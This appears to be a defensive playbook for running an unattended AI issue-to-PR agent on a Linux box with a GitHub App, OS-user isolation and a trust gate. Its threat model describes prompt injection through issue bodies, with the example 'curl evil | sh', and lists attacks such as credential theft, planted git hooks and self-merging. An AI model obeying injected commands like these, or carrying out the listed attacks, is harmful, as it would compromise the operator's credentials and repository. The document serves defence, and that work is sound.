# Secure unattended agent loop: OS user + GitHub App + trust gate

A generic playbook for running an AI issue loop (an agent builds labelled GitHub
issues into pull requests overnight) on your own box or against a team repo, with
the blast radius bounded by the operating system and GitHub rather than by prompts.

Placeholders used throughout: `<owner>` and `<repo>` (the GitHub repo the loop
works on), `<base>` (the branch PRs target, for example `next`), `<box>` (the
Linux machine), `<loop-user>` (the dedicated OS user), `<app-slug>` (the GitHub
App's slug), `<operator-login>` (your GitHub login), `<slug>` (`<owner>/<repo>`
with every character outside `[A-Za-z0-9_.-]` replaced by `-`).

> **Status of the code this playbook drives.** The design is specified in the
> OpenSpec change [`openspec/changes/loops/`](../../openspec/changes/loops/)
> (`design.md`, `specs/issue-loop-runner/spec.md`, `tasks.md`). Verified against
> the `next` branch on 2026-10-10: the runner (`run-issues.sh`), the App token
> minter (`scripts/lib/gh-app-token.sh`), the schedule renderer and
> `instantiate.sh --profile linux` are **specified, not yet merged**. Steps 1 to 7
> below (App, key, OS user, Claude login, env file, ruleset) need no the-grid code
> and can be done now; steps 8 to 11 need the runner and its token minter. Where this playbook states
> runner behaviour it is quoting the spec, not observed output. The one-shot box
> setup script is a proven private script today; a portable version is tracked in
> the-grid issue #164. Operator steps in full:
> [`docs/uplift-runbook.md`](../../docs/uplift-runbook.md).

---

## 1. What this is and when you need it

An **unattended issue loop** is a scheduled job: at night a runner picks issues
carrying an opt-in label (`ready-for-agent`), has a model implement each one in a
throwaway git worktree, pushes a branch, opens a PR against `<base>`, and posts a
second model's review as a PR comment. A human reviews and merges in the morning.
The runner never merges and never closes the issue.

You need this playbook if:

- the agent runs with permissions off (`--dangerously-skip-permissions`), because nobody is there to click "allow";
- it reads text written by people (issue bodies, linked pages, skills) and acts on it;
- it runs on a machine that also holds your own credentials (a personal box), or on a repo other people depend on (a team repo).

You do **not** need it for an interactive session you are watching, or for a job
that only reads.

What you end up with:

| Property | How |
|---|---|
| The agent cannot read your files | dedicated OS user, your home not listable by it |
| The agent never holds a GitHub token | the runner holds it; the model process runs without it |
| A leaked token expires in an hour | GitHub App installation tokens, minted per run |
| The agent cannot push to the base branch | token scope plus a server-side ruleset |
| Random issue text cannot trigger a build | trust gate on author, labeller and editors |
| Spend is bounded | per-call `--max-budget-usd` and `timeout` on every model call |

---

## 2. Threat model in plain terms

**The setup:** an agent with permissions off can run any shell command as whatever
OS user it runs as, and it takes instructions from text it reads. That text can be
hostile: an issue body written by a stranger, a web page it fetches, a skill or
dependency it pulls in. This is prompt injection: the text says "also run
`curl evil | sh`" and the model may comply.

**What could go wrong if you do nothing:**

1. It reads your SSH keys, cloud credentials, browser profile or other repos and sends them out.
2. It uses a GitHub token in its environment to push to `main`, delete branches, edit workflows, or merge its own PR.
3. It plants a git hook or a modified script that runs later, with more privilege than the agent had.
4. A stranger opens an issue, or edits one you already labelled, and gets code executed on your box.
5. It loops and burns money.

**The boundary is not the prompt.** "Never push to main" in the prompt is a
request, not a control. The controls are things the model cannot talk its way past:

| Boundary | Enforced by | Stops |
|---|---|---|
| OS-user isolation | kernel file permissions | 1 (reading your files) |
| Token scope | GitHub (App permissions, one installed repo) | 2 (admin actions, other repos, workflows) |
| Server-side rules | GitHub ruleset on `<base>` | 2 (pushing or merging without a PR) |
| Token kept out of the model's process | the runner (not the agent) pushes and opens PRs | 2 and 3 |
| Hooks disabled on the runner's push | `git -c core.hooksPath=/dev/null push --no-verify` | 3 |
| Trust gate | the runner checks GitHub's own records before any model call | 4 |
| Budget and timeout caps | per-call flags and `timeout` | 5 |

A guard hook that blocks `git push origin <base>` also exists, but the spec calls
it a mistake-catcher, not a boundary: it does not inspect `bash -c`, `eval`,
aliases or scripts that call git.

---

## 3. The pieces and why each exists

### 3.1 Dedicated unprivileged OS user

| Requirement | Why |
|---|---|
| Own home, own clone, own `claude` login, own env file | nothing the loop needs is shared with you |
| Home mode 750, owned by the loop user | other users cannot read what the loop holds |
| Your home not listable by `<loop-user>` (mode 750 or 700, loop user not in your group) | the agent cannot read your files |
| No sudo, not in `sudo`/`admin`/`wheel`, no sudoers entry | it cannot become root |
| No password (locked account) | no password login |
| Linger enabled (`loginctl enable-linger`) | `systemctl --user` timers fire while nobody is logged in; without it a missed night runs at your next login |

The runner enforces the isolation mechanically: `LOOP_OPERATOR_HOME` must exist
and `ls "$LOOP_OPERATOR_HOME"` must **fail** as the loop user, or it exits 2
before touching anything.

### 3.2 GitHub identity: App vs machine user vs personal token

| | Personal access token | Machine user (second GitHub account) | GitHub App (recommended) |
|---|---|---|---|
| Extra account | no | yes (a seat, 2FA, email) | no |
| Credential lifetime | long-lived until revoked | long-lived until revoked | installation token valid 1 hour, minted from a private key |
| Scope | whatever you grant, often account-wide | per-repo collaborator grants | per-repo installation, fixed permission set |
| Shows on PRs as | you (you cannot approve your own PR) | the machine user | `<app-slug>[bot]` |
| Needs a webhook or server | no | no | no (leave webhooks off) |
| If the secret leaks | revoke it | revoke it | delete the key in App settings; unlike a token, a stolen key mints new tokens until you do |

The spec picks the App: no second account, no long-lived bearer secret, scope fixed
at install time, and the bot identity is distinct from yours so you can approve
its PRs. The runner refuses an env file containing `GH_TOKEN=` or `GITHUB_TOKEN=`
(a leftover PAT would defeat the point).

### 3.3 Minimal App permissions

| Permission | Level | Reason |
|---|---|---|
| Contents | Read and write | push the issue branch |
| Pull requests | Read and write | open the PR, comment the review |
| Issues | Read and write | relabel, comment outcomes |
| Metadata | Read | mandatory, set automatically |
| Administration | none | the token must not be able to change rules |
| Workflows | none | the token must not be able to edit CI files; a push touching them is rejected |
| Webhook | off | no server, no inbound surface |

Preflight checks the minted token's `permissions` object has no `administration`
and no `workflows` key; either one is an exit 2.

### 3.4 Per-repo installation

Install the App on the one repo the loop works on ("Only select repositories").
The installation decides which repos a minted token can reach. Preflight confirms
`gh api /installation/repositories` lists `<owner>/<repo>`, and that `gh api user`
**fails** (an installation token is a bot, not a person; this is how the runner
knows it is not holding a personal token).

### 3.5 Ruleset on the base branch

A repository **ruleset** on `<base>` with "Require a pull request before merging".
The App must not be on the bypass list. The spec's runbook uses an **empty** bypass
list; a human admin bypass is a conscious weakening for your own convenience, not
something the runner checks.

Preflight reads `gh api repos/<owner>/<repo>/rules/branches/<base>` and needs at
least one `pull_request` rule. Classic branch protection cannot be verified with a
non-admin token, so it does not satisfy preflight; use a ruleset. (Rulesets on
private repos need a paid GitHub plan.)

### 3.6 Trust gate

Before any worktree or model call for an issue, the runner requires **all** of:

| Check | Source |
|---|---|
| Issue author's `author_association` is `OWNER`, `MEMBER` or `COLLABORATOR` | `repos/<owner>/<repo>/issues/<n>` |
| The actor of the **last** `labeled` event for the opt-in label is in `LOOP_TRUSTED_ACTORS` | issue events API |
| Every actor of a `renamed` event is in `LOOP_TRUSTED_ACTORS` | issue events API |
| Every editor of the issue body is in `LOOP_TRUSTED_ACTORS` | GraphQL `userContentEdits` |

Any failure: the issue gets `needs-human`, loses the opt-in label, gets a comment
naming the failed check, and the run moves on. No model call happens.
Issue **comments** are never given to the worker; the prompt holds only the
title and body, and the worker is told not to fetch the issue.

### 3.7 The runner holds the token, the worker never does

The model process runs with `GH_TOKEN`, `GITHUB_TOKEN` and `CLAUDE_CODE_OAUTH_TOKEN`
unset (`env -u`). The runner keeps the installation token in an unexported shell
variable and passes it per call (`GH_TOKEN=… gh …`, `GH_TOKEN=… git …`). The worker
only commits on `issue-<n>` in its worktree and writes one outcome line
(`done | needs-human <reason> | blocked <reason>`). The runner decides from git
state plus that line whether to push, and it does the push, the PR, the labels and
the comments.

### 3.8 Push with hooks disabled

A worker can write a git hook into its worktree. Pushing with the token in the
environment would run it. The runner therefore pushes with
`git -c core.hooksPath=/dev/null push --no-verify origin HEAD:refs/heads/issue-<n>`.

### 3.9 Token minted per run

`gh-app-token.sh` signs a short-lived RS256 JWT (expiry at most 10 minutes) with
the App key and exchanges it for an installation token (1 hour). It needs only
`openssl`, `curl` and `jq`. A run can outlast an hour, so the runner re-mints when
the token is older than 45 minutes (start of each issue, before pushing, before
posting the review). Env file and key file must be mode 600 or the runner refuses
to start. The env file is **parsed**, never sourced, and only five keys are read.

---

## 4. Step-by-step setup

Run steps on the box over SSH unless marked `[browser]`. `[sudo]` needs sudo.
Commands are quoted from the runbook and spec; they were not run on the machine
that wrote this playbook (macOS). Steps marked **needs runner** wait for the
`loops` change.

### Step 1 `[browser]` Create the GitHub App

Account settings (personal) or organization settings (team): GitHub Apps > New.

- Name: `<app-name>`. Names are global; the slug (`<app-slug>`) is derived from it.
- Webhook: untick **Active**.
- Repository permissions: exactly the table in 3.3.
- Installable on: **Only on this account**.

Note the **App ID** (a number, not the Client ID).

Success: the settings page shows the App ID and exactly four permissions.

### Step 2 `[browser]` Install on one repo

Install App > Only select repositories > `<owner>/<repo>`. Note the **installation
id**: the number at the end of `.../settings/installations/<id>`.

Success: the install page lists exactly one repository.

### Step 3 `[browser]` Generate the private key, and handle it

App settings > Private keys > Generate. A `.pem` downloads.

- Never put it in `/tmp`, `/var/tmp` or `/dev/shm`, a repo, chat, or a shell-history line.
- Keep one copy in your own home on the box, mode 600; install it for the loop user in step 5; delete the source afterwards (`shred -u`, else `rm`).

```bash
# from your workstation: straight into your home on the box, not /tmp
scp ~/Downloads/<app-slug>.*.private-key.pem <box>:~/app.pem
ssh <box> 'chmod 600 ~/app.pem'
```

Success: `head -1 ~/app.pem` on the box prints `-----BEGIN RSA PRIVATE KEY-----` (or `PRIVATE KEY`).

### Step 4 `[sudo]` Create the OS user and prove isolation

The setup script (private today, see #164) does these as idempotent phases, each
reporting `[ ok ]`, `[ fix ]` or `[FAIL]`. Manual equivalents:

| Phase | What it does | Manual equivalent |
|---|---|---|
| user | create `<loop-user>`: own group, own home, `/bin/bash`, no password | `sudo useradd -m -s /bin/bash <loop-user>` |
| no sudo | refuse if in `sudo`/`admin`/`wheel` or has a sudoers entry | `id -nG <loop-user>`; `sudo -l -U <loop-user>` |
| home | `~<loop-user>` mode 750 | `sudo chmod 750 ~<loop-user>` |
| isolation | prove the loop user **cannot** list your home; report the fix, never change your home itself | `chmod 750 "$HOME"` then `sudo -u <loop-user> ls "$HOME"` must fail |
| linger | `loginctl enable-linger` | `sudo loginctl enable-linger <loop-user>` |
| tools | `git gh jq curl openssl` present (optional apt install) | `command -v git gh jq curl openssl` as the loop user |
| config | `~/.config/the-grid` mode 700, env-file template mode 600, never overwrites an existing env file | step 6 |
| app ids | set `GH_APP_ID`, `GH_APP_INSTALLATION_ID` in place, never add `GH_TOKEN` | step 6 |
| app key | install key mode 600 owned by the loop user, verify with `cmp`, delete the source; refuses sources under `/tmp` etc. or readable by group/other | `sudo install -o <loop-user> -g <loop-user> -m 600 ~/app.pem ~<loop-user>/.config/the-grid/app.pem && shred -u ~/app.pem` |
| claude | install `claude` as the loop user (the installer refuses root) | step 5 |
| identity | `git config --global user.name "<app-slug>[bot]"`, `user.email "<app-id>+<app-slug>[bot]@users.noreply.github.com"` | step 6 |
| manual report | lists what is left: Claude login, clone, token check | steps 5 and 8 |

Script modes:

| Mode | Effect |
|---|---|
| `--dry-run` | prints the plan, writes nothing, no sudo needed |
| `--check` | read-only report; exits non-zero if anything needs action or a probe could not run (needs sudo to inspect the loop user's home) |
| (default) | apply; every mutation goes through one `act()` function, so dry-run and check cannot drift from the real path |

A second apply run is a clean no-op.

Success: `sudo -u <loop-user> ls "$HOME"` fails with "Permission denied";
`loginctl show-user <loop-user> --property=Linger --value` prints `yes`.

### Step 5 `[sudo]` Install Claude and log in as the loop user

```bash
sudo -iu <loop-user>
# check Anthropic's current install command first; at the time of writing:
curl -fsSL https://claude.ai/install.sh | bash
~/.local/bin/claude          # prints a login URL; complete it in a browser, then /exit
~/.local/bin/claude auth status --text
gh auth status               # must FAIL: the loop user must have no stored gh login
exit
```

Success: `auth status` shows logged in; `gh auth status` fails. Install the key
now if the script did not (`sudo install ...` from the table in step 4).

### Step 6 Env file and git identity

As the loop user, `umask 077`. The runner reads only these keys:

```bash
cat > ~/.config/the-grid/issue-loop.env <<'EOF'
GH_APP_ID=<app-id>
GH_APP_INSTALLATION_ID=<installation-id>
LOOP_TRUSTED_ACTORS=<operator-login>
LOOP_OPERATOR_HOME=<your home path on the box>
EOF
git config --global user.name  "<app-slug>[bot]"
git config --global user.email "<app-id>+<app-slug>[bot]@users.noreply.github.com"
find ~/.config/the-grid/issue-loop.env ~/.config/the-grid/app.pem -perm -077   # must print nothing
```

| Key | Required | Meaning |
|---|---|---|
| `GH_APP_ID` | yes | the App ID |
| `GH_APP_INSTALLATION_ID` | no | if absent the minter uses the single installation, and errors if there are several |
| `GH_APP_KEY_FILE` | no | default `$HOME/.config/the-grid/app.pem` |
| `LOOP_TRUSTED_ACTORS` | yes | comma-separated GitHub logins (human) whose labelling and edits are trusted |
| `LOOP_OPERATOR_HOME` | yes | a path the loop user must not be able to list |

No `GH_TOKEN=` line, ever.

### Step 7 `[browser]` Ruleset on `<base>`

Settings > Rules > Rulesets > New branch ruleset: Enforcement **Active**; target
branch `<base>`; rule "Require a pull request before merging"; bypass list **empty**
(the App must not be on it). Required approvals may stay 0 for a personal repo.

Consequence: nobody pushes to `<base>` directly while it is active. To push
yourself, set the ruleset to Disabled for that moment and Active again; never leave
it off overnight.

### Step 8 Clone and verify token and rules

Needs `gh-app-token.sh` (runner change). The minter is the-grid's
`scripts/lib/gh-app-token.sh` and depends on nothing else, so for a repo that is not
the-grid, copy that one file to the box first (`scp` it to your home, then
`MINT=<path>`); `instantiate.sh` later places a copy at `loop/gh-app-token.sh`.
Clone over https, because the runner refuses an SSH `origin` (an SSH key in the
loop user's home would give the worker push access).

```bash
sudo -iu <loop-user>
MINT=<path to gh-app-token.sh, readable by the loop user>
ids() { sed -n "s/^$1=//p" ~/.config/the-grid/issue-loop.env; }
export GH_APP_ID="$(ids GH_APP_ID)" GH_APP_INSTALLATION_ID="$(ids GH_APP_INSTALLATION_ID)"
tok="$(bash "$MINT")"                                # one stderr line naming the cause on failure
GH_TOKEN="$tok" gh auth setup-git                       # HTTPS pushes use the per-call GH_TOKEN
GH_TOKEN="$tok" git clone https://github.com/<owner>/<repo>.git ~/<repo>
cd ~/<repo>
bash "$MINT" --json | jq '{permissions, repository_selection}'
GH_TOKEN="$tok" gh api /installation/repositories --jq '.repositories[].full_name'
GH_TOKEN="$tok" gh api user 2>&1 | head -3
GH_TOKEN="$tok" gh api repos/<owner>/<repo> --jq .permissions
GH_TOKEN="$tok" gh api repos/<owner>/<repo>/rules/branches/<base> --jq '[.[] | select(.type=="pull_request")] | length'
unset tok
```

Success checks:

| Command | Expect |
|---|---|
| `... --json \| jq` | no `administration`, no `workflows`; `repository_selection` is `selected` |
| `/installation/repositories` | only `<owner>/<repo>` |
| `gh api user` | **fails** (HTTP 403 "Resource not accessible by integration") |
| `.permissions` | `push: true`, `admin: false` |
| rules count | 1 or more |

The spec lists two of these as UNVERIFIED until run on a real box: that `gh`'s git
credential helper accepts an installation token, and that the rules endpoint answers
to an installation token. If either fails, stop; the fix is a runner change (for
example per-call basic auth `x-access-token:<token>`), not a workaround on the box.

### Step 9 Cut the loop into the repo (needs runner)

```bash
bash scripts/instantiate.sh issue-loop . --profile linux --base-branch <base> --verify-cmd "<your verify command>"
bash loop/setup.sh
```

`instantiate.sh` writes the systemd user service and timer and prints the
activation commands; it never runs `systemctl`. `setup.sh` wires the guard hook.
Tunables live in `loop/loop.conf` (`MAX_ISSUES`, `MAX_BUDGET_USD`, `ISSUE_TIMEOUT`,
`WORKER_MODEL`, `REVIEW_MODEL`, ...); an environment variable of the same name
overrides the file. Edit via a systemd drop-in rather than the tracked file: the
runner refuses a dirty tree.

### Step 10 Prove it on a sandbox repo first

Do not skip. Use a throwaway **public** repo (rulesets are free there) with
`<base>`, a PR-requiring ruleset, the App installed on it, and two trivial issues
you label yourself. Observe, and keep the output:

- everything runs as `<loop-user>`, which cannot list your home;
- two PRs to `<base>` opened by `<app-slug>[bot]`; the worker's environment held no token;
- each PR has a review comment, the issues are relabelled `ready-for-human` and still open;
- two run-log lines, no worktrees left behind;
- a stripped-environment run works: `sudo -iu <loop-user>`, then `env -i HOME="$HOME" PATH=/usr/bin:/bin bash loop/run-issues.sh`;
- an issue opened by a non-collaborator and labelled by you ends `needs-human` with no model call;
- the same cycle fires from systemd with you logged out: `systemctl --user start issue-loop-<slug>.service`.

### Step 11 Go live

1. Add the ruleset (step 7) and install the App (step 2) on the real repo; remove the sandbox from the installation and disable its timer.
2. Run one manual cycle on a single trivial labelled issue and read the PR it opens:
   ```bash
   systemctl --user start issue-loop-<slug>.service
   journalctl --user -u issue-loop-<slug>.service -n 50 --no-pager
   ```
3. Only if that PR looks right, enable the timer:
   ```bash
   systemctl --user daemon-reload && systemctl --user enable --now issue-loop-<slug>.timer
   systemctl --user list-timers issue-loop-<slug>.timer
   ```

Success: `list-timers` shows a next fire time (default 02:00 daily). Runner exit
codes: 0 run finished, 1 infrastructure failure (run stopped early), 2 preflight
failed (nothing touched; the journal line names the fix).

---

## 5. Teams and organisations (the work case)

Everything above holds. These are the differences.

### 5.1 Who owns what

| Item | Recommendation |
|---|---|
| The App | owned by the **organisation**, not an individual, so it survives people leaving |
| Installation | an org owner installs it on each repo the loop may work on (repository selection, not "all repositories") |
| Base-branch rules | org or repo ruleset on `<base>`: require a PR, plus CODEOWNERS and required reviews (below) |
| The loop user and box | owned by a platform or infra role, not by one developer's laptop |

Org-owned App creation and org-owner installation approval follow GitHub's standard
behaviour; the-grid's own setup used a personal account, so those org-specific
screens are not exercised by this repo's runbook. Check GitHub's current docs.

### 5.2 Trusted actors: list today, team check is a proposal

The runner supports **only a static list**: `LOOP_TRUSTED_ACTORS=login1,login2` in
the loop user's env file (kept out of the tracked repo on purpose). A GitHub
**team-membership** check as an alternative is **not implemented and not in the
spec**; it would need a runner change and a read permission on organisation
members. It is a proposed extension, tracked with the setup generalisation in
the-grid issue #164. Until then, treat the
env file as the access-control list for who can start a build, and change it
through your normal access review.

The list is checked together with `author_association` (`OWNER`, `MEMBER` or
`COLLABORATOR`), so an outside contributor cannot be built even if someone lists
them.

### 5.3 CODEOWNERS and required reviews

The loop's PRs are authored by `<app-slug>[bot]`, so any human can review them.

- Add `CODEOWNERS` for sensitive paths and enable "Require review from Code Owners" and at least one required approval in the ruleset's pull request rule.
- The second model's review is an advisory comment only; it is never an approval.
- The App has no Workflows permission, so CI definition files are protected from the loop. Changes to scripts that CI runs are not, which is why a human review is the real merge gate (see 7).

### 5.4 The App key: who holds it, rotate, revoke

- One or two named custodians (org owners or platform engineers). The key lives only on the loop box (mode 600, loop user) and in the custodian's secret store, not in a repo or chat.
- Rotate: generate a new key in App settings, install it over `~<loop-user>/.config/the-grid/app.pem` (`sudo install -o <loop-user> -g <loop-user> -m 600`), run the step 8 mint check, then delete the old key in App settings. There is no token to rotate: tokens last an hour.
- Revoke: delete the key, then suspend or uninstall the App. Deleting the key is the first response to a suspected leak.

### 5.5 One loop user per repo or per team

An installation token reaches whatever the App is installed on, and one env file
serves one App. Isolate blast radius by splitting:

| Split | When |
|---|---|
| One loop user + App installation per **repo** | repos with different sensitivity or different reviewers |
| One loop user per **team** | a team owns several low-risk repos and its own trusted-actor list |
| Shared loop user across teams | avoid: the worker could read another team's clone and env file |

Every other human's home on a shared box must also be unlistable by the loop user.
`LOOP_OPERATOR_HOME` only checks one path; the others are on you.

### 5.6 Audit

| Question | Where to look |
|---|---|
| What did the loop do? | PRs authored by `<app-slug>[bot]`: `gh pr list -R <owner>/<repo> --app <app-slug> --state all` |
| Why was an issue refused? | the `needs-human` comment, "issue-loop trust gate: <check>" |
| What did a run cost? | one run record per issue (`--action work-issue`, with cost and outcome) in the loop user's run log |
| Did the unit run? | `journalctl --user -u issue-loop-<slug>.service` |
| Who can trigger builds? | `LOOP_TRUSTED_ACTORS` in the env file |

### 5.7 What to tell colleagues

- Add the opt-in label (`ready-for-agent`) only to issues whose acceptance criteria are clear and testable.
- An issue is built only if you are a repo member or collaborator **and** the person who last applied the label, and every person who edited the issue body, is on the trusted list. Otherwise it goes to `needs-human` and nothing runs.
- **Editing an issue that someone else labelled drops it from the loop** unless you are on the list too. Re-label after editing, or ask a listed person to.
- Write the issue so the title and body are the whole task. The worker never sees comments.
- Results come back as a PR plus a `ready-for-human` label. The issue stays open. Review it like any other PR.

---

## 6. Operations

| Task | Commands |
|---|---|
| Skip tonight, keep the timer | `systemctl --user stop issue-loop-<slug>.timer` (re-arm with `start`) |
| Turn off | `systemctl --user disable --now issue-loop-<slug>.timer` |
| Abort a run in progress | `systemctl --user stop issue-loop-<slug>.service` (kills children; the runner removes its worktree and lock) |
| Take issues out of the queue | `gh issue edit <n> -R <owner>/<repo> --remove-label ready-for-agent` |
| Rotate the App key | see 5.4 |
| Revoke access now | delete the key in App settings, then suspend or uninstall the App (a token minted in the last hour works until it expires unless the App is suspended) |
| Add a second repo | install the App on it (Install App > Configure > Repository access), add the ruleset, clone as the loop user over https, run `instantiate.sh` in that clone. The same env file serves both only if both repos accept the same trusted-actor list; otherwise use a second loop user (5.5) |
| Change nightly volume | systemd drop-in: `systemctl --user edit issue-loop-<slug>.service` with `Environment=MAX_ISSUES=...` and a matching `TimeoutStartSec=` (`MAX_ISSUES*(ISSUE_TIMEOUT+REVIEW_TIMEOUT)+600`) |
| Uninstall | see below |

Kill switch (stop everything, as the loop user then admin):

```bash
systemctl --user disable --now issue-loop-<slug>.timer
systemctl --user stop issue-loop-<slug>.service
# delete the App's private key, then Suspend or Uninstall the App (App settings)
gh issue list -R <owner>/<repo> --label ready-for-agent --state open --json number --jq '.[].number' \
  | while read -r n; do gh issue edit "$n" -R <owner>/<repo> --remove-label ready-for-agent; done
sudo loginctl disable-linger <loop-user>
sudo usermod -L <loop-user>
```

Success: `list-timers` no longer shows the timer; running the minter
(`gh-app-token.sh`) exits 1.

Uninstall fully: kill switch, then delete the ruleset only if nothing else needs it,
remove the App (App settings > Advanced > Delete), `sudo userdel -r <loop-user>`
(this deletes its clone, env file, key copy and Claude login), delete your own
`~/app.pem` source if any remains, and remove the opt-in labels if unused.

Common preflight failures (exit 2) and fixes:

| Journal says | Fix |
|---|---|
| env file or key mode | `chmod 600` the file |
| `LOOP_TRUSTED_ACTORS` empty, or operator home listable | fix the env file; `chmod 750` (or 700) your home |
| claude not logged in | `sudo -iu <loop-user>`, run `claude`, log in |
| stored `gh` login | `sudo -iu <loop-user> gh auth logout` |
| cannot mint / not an installation token | run `gh-app-token.sh` by hand with the three `GH_APP_*` values and read its one error line (wrong ids, key missing or not 600, App not installed on the repo, App suspended, clock far off) |
| `GH_TOKEN=` in env file | delete the line |
| origin must be https | `git remote set-url origin https://github.com/<owner>/<repo>.git` |
| no `pull_request` rule, or App has Administration or Workflows | fix the ruleset (step 7) or App permissions (step 1, then accept on the installation page) |
| tree not clean | discard stray changes in the loop user's clone |

---

## 7. Known limits and residual risk

From the spec's own statement, plus a few consequences.

1. **The worker is the same OS user as the runner.** A deliberately hostile worker could read the env file, the App key file and the token. `env -u` stops the token reaching tool output, logs and child processes **by accident**, not against intent. What bounds a deliberate read: one installed repo, no Workflows or Administration, a 1-hour token, the ruleset requiring PRs, and the ability to revoke the key. Unlike a PAT, a stolen **key** mints new tokens until deleted.
2. **No container.** Isolation is OS-user level on a shared kernel. Network egress is open: the worker can send out anything it can read, including the loop user's Claude login file and the repo contents. Use a Claude account and plan you are happy to expose to the loop user, and do not put other secrets in that home.
3. **Web access is on in the worker** (the spec allows it because isolation is mandatory). A page the worker fetches is another source of injected text; it still cannot hold a GitHub token.
4. **The guard hook is a mistake-catcher.** It does not inspect `bash -c`, `eval`, aliases or scripts that call git. The boundary is the ruleset and token scope.
5. **The runner does not re-run your verify command before opening the PR.** The review comment, CI on the PR and your merge are the gate. Reviews are advisory and are never approvals or merges.
6. **Trust gate depends on GitHub's records.** It is as good as the events and association data GitHub returns, and as good as your trusted-actor list.
7. **Not in the spec, general GitHub behaviour:** a PR from a branch in the same repo can run CI that has access to repository secrets. The App cannot edit workflow files, but it can change scripts and tests that a workflow executes. Review PRs as untrusted code, and do not expose production secrets to PR-triggered workflows.
8. **Two behaviours were UNVERIFIED in the design** and must be proven on your box (step 8): `gh`'s git credential helper with an installation token, and the rules endpoint with an installation token.
9. **Spend.** Every model call carries a model, a `--max-budget-usd` and a `timeout`. The spec's sandbox proof (task 5.6) checks that the cap is honoured under a subscription login; watch the run log until you have seen it. The CLI version the spec was drafted against did not list `--max-turns`; the runner passes it only if `claude --help` lists it.
10. **macOS as the loop box** is documented in the spec as untested: a LaunchAgent needs the loop user logged in to a GUI session, and the Claude login may sit in the Keychain, which a bare SSH session cannot read.

If any of these is unacceptable for your repo, stop at the sandbox (step 10) and
do not go live.

---

## References

- Spec and design: [`openspec/changes/loops/design.md`](../../openspec/changes/loops/design.md), [`specs/issue-loop-runner/spec.md`](../../openspec/changes/loops/specs/issue-loop-runner/spec.md), [`tasks.md`](../../openspec/changes/loops/tasks.md)
- Operator runbook for the-grid's own loop: [`docs/uplift-runbook.md`](../../docs/uplift-runbook.md)
- Pattern: [`automation-factory/patterns/issue-loop/`](../patterns/issue-loop/)
- Portable box-setup script: the-grid issue #164
